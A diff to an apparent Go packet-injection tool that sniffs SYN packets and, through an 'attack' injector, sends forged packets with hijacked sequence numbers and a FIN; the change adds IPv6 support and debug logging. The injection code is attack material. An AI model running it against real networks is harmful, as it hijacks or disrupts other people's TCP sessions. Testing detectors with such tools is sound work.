@@ -26,6 +26,7 @@ import (
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
 	"github.com/google/gopacket/tcpassembly"
+	"net"
 	"log"
 	"math/rand"
 	"time"
@@ -34,7 +35,7 @@ import (
 var iface = flag.String("i", "lo", "Interface to get packets from")
 var filter = flag.String("f", "tcp and dst port 9666 and tcp[tcpflags] == tcp-syn", "BPF filter for pcap")
 var snaplen = flag.Int("s", 65536, "SnapLen for pcap packet capture")
-var serviceIPstr = flag.String("d", "127.0.0.1", "target TCP flows from this IP address")
+var serviceIPstr = flag.String("d", "127.0.0.1", "target TCP flows from this IPv4 or IPv6 address")
 var servicePort = flag.Int("e", 9666, "target TCP flows from this port")
 
 func main() {
@@ -43,6 +44,7 @@ func main() {
 	var eth layers.Ethernet
 	var dot1q layers.Dot1Q
 	var ip4 layers.IPv4
+	var ip6 layers.IPv6
 	var tcp layers.TCP
 	var payload gopacket.Payload
 
@@ -51,25 +53,32 @@ func main() {
 
 	decoded := make([]gopacket.LayerType, 0, 4)
 
-	streamInjector := attack.TCPStreamInjector{}
-	err := streamInjector.Init("0.0.0.0")
-	if err != nil {
-		panic(err)
-	}
-
 	handle, err := pcap.OpenLive(*iface, int32(*snaplen), true, pcap.BlockForever)
 	if err != nil {
 		log.Fatal("error opening pcap handle: ", err)
 	}
+	ipv6_mode := false
+	serviceIP := net.ParseIP(*serviceIPstr)
+	if serviceIP.To4() == nil {
+		log.Print("using ipv6 mode")
+		ipv6_mode = true
+	} else {
+		log.Print("using ipv4 mode")
+	}
+
+	streamInjector := attack.NewTCPStreamInjector(handle, ipv6_mode)
+
 	if err := handle.SetBPFFilter(*filter); err != nil {
 		log.Fatal("error setting BPF filter: ", err)
 	}
 	parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet,
-		&eth, &dot1q, &ip4, &tcp, &payload)
+		&eth, &dot1q, &ip4, &ip6, &tcp, &payload)
 
 	log.Print("collecting packets...\n")
 	for {
-		data, ci, err := handle.ZeroCopyReadPacketData()
+		log.Print("before ReadPacketData")
+		data, ci, err := handle.ReadPacketData()
+		log.Print("after ReadPacketData")
 		if err != nil {
 			log.Printf("error getting packet: %v %s", err, ci)
 			continue
@@ -79,6 +88,8 @@ func main() {
 			log.Printf("error decoding packet: %v", err)
 			continue
 		}
+
+		log.Printf("got packet of len %d", len(data))
 
 		// craft a response to the client
 		// here we reuse the client's header
@@ -103,11 +114,14 @@ func main() {
 		tcp.SYN = true
 		tcp.RST = false
 
-		err = streamInjector.SetIPLayer(ip4)
-		if err != nil {
-			panic(err)
+		streamInjector.SetEthernetLayer(&eth)
+		if ipv6_mode {
+			streamInjector.SetIPv6Layer(ip6)
+		} else {
+			streamInjector.SetIPv4Layer(ip4)
 		}
 		streamInjector.SetTCPLayer(tcp)
+		log.Print("before panic be here now")
 		err = streamInjector.Write()
 		if err != nil {
 			panic(err)
@@ -123,10 +137,12 @@ func main() {
 		tcp.Ack = uint32(tcpassembly.Sequence(seq).Add(1))
 		tcp.Seq = uint32(tcpassembly.Sequence(hijackSeq).Add(1))
 
-		err = streamInjector.SetIPLayer(ip4)
-		if err != nil {
-			panic(err)
+		if ipv6_mode {
+			streamInjector.SetIPv6Layer(ip6)
+		} else {
+			streamInjector.SetIPv4Layer(ip4)
 		}
+
 		streamInjector.SetTCPLayer(tcp)
 		err = streamInjector.Write()
 		if err != nil {
@@ -141,15 +157,18 @@ func main() {
 		tcp.ACK = false
 		tcp.Seq = uint32(tcpassembly.Sequence(hijackSeq).Add(2))
 
-		err = streamInjector.SetIPLayer(ip4)
-		if err != nil {
-			panic(err)
+		if ipv6_mode {
+			streamInjector.SetIPv6Layer(ip6)
+		} else {
+			streamInjector.SetIPv4Layer(ip4)
 		}
+
 		streamInjector.SetTCPLayer(tcp)
 		err = streamInjector.Write()
 		if err != nil {
 			panic(err)
 		}
 		log.Print("FIN packet sent!\n")
+		return
 	}
 }
